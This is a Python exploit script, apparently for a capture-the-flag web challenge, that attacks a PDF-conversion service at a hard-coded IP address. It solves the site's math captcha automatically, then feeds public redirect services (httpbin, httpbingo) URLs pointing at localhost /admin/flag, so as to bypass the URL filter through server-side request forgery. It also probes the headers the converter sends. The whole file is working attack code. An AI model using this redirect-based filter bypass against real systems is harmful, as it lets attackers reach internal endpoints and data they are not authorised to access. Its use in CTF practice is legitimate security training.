#!/usr/bin/env python3
"""
Web 2 Doc 1 - Redirect-based SSRF

Key insight: The URL filter likely validates the INITIAL URL only.
If we can set up a redirect from an allowed domain to localhost,
the PDF converter might follow the redirect.

Options:
1. Use a public redirect service 
2. The app might embed content differently
"""

import requests
import re
import urllib.parse

BASE_URL = "http://52.59.124.14:5002"

def get_captcha(session):
    """Get the main page and extract the captcha challenge."""
    resp = session.get(f"{BASE_URL}/")
    # Look for: Math Challenge: X OP Y = ?
    match = re.search(r'Math Challenge:\s*(\d+)\s*([+\-*])\s*(\d+)\s*=', resp.text)
    if match:
        a, op, b = int(match.group(1)), match.group(2), int(match.group(3))
        if op == '+':
            return a + b
        elif op == '-':
            return a - b
        elif op == '*':
            return a * b
    return None

def ssrf_fetch(session, internal_url):
    """Use the PDF converter to fetch an internal URL via SSRF."""
    captcha = get_captcha(session)
    if captcha is None:
        print("[!] Could not solve captcha")
        return None
    
    resp = session.post(f"{BASE_URL}/convert", data={
        "url": internal_url,
        "captcha_answer": str(captcha)
    })
    
    return resp

def main():
    session = requests.Session()
    
    # Test redirect services that might work
    localhost_targets = [
        "http://127.0.0.1:5002/admin/flag?i=0&c=C",
        "http://localhost:5002/admin/flag?i=0&c=C",
    ]
    
    redirect_services = [
        # httpbingo.org - a test REST server
        lambda t: f"https://httpbingo.org/redirect-to?url={urllib.parse.quote(t)}",
        
        # Mocky.io alternative - httpbin.org
        lambda t: f"https://httpbin.org/redirect-to?url={urllib.parse.quote(t)}",
        
        # ngrok alternative pattern (doesn't work without own server)
        # Try using request.basecamps.io which redirects
    ]
    
    print("[*] Testing redirect services...\n")
    
    for target in localhost_targets[:1]:  # Just test first target
        for get_redirect_url in redirect_services:
            url = get_redirect_url(target)
            print(f"[*] Testing: {url[:80]}...")
            
            resp = ssrf_fetch(session, url)
            if resp is None:
                print(f"    -> Captcha failed")
                continue
            
            status = resp.status_code
            content_type = resp.headers.get('Content-Type', 'unknown')
            
            if status == 200 and 'pdf' in content_type.lower():
                print(f"    -> SUCCESS! PDF {len(resp.content)} bytes")
                with open("redirect_test.pdf", "wb") as f:
                    f.write(resp.content)
            else:
                try:
                    error = resp.json().get('error', 'unknown')
                except:
                    error = resp.text[:100]
                print(f"    -> {status}: {error}")
    
    # Let's also check if maybe we need to look at this differently
    # What if the filter is on the URL we provide, but the PDF library
    # adds an X-Fetcher header? Let's test what happens when we convert
    # a normal page that shows headers
    
    print("\n[*] Testing what headers are sent by the PDF converter...")
    
    # Use a service that echoes back the request
    resp = ssrf_fetch(session, "https://httpbin.org/headers")
    if resp and resp.status_code == 200 and 'pdf' in resp.headers.get('Content-Type', '').lower():
        print(f"[+] Got PDF with headers info: {len(resp.content)} bytes")
        with open("headers_test.pdf", "wb") as f:
            f.write(resp.content)
        print("[*] Check headers_test.pdf to see what headers are sent!")

if __name__ == "__main__":
    main()
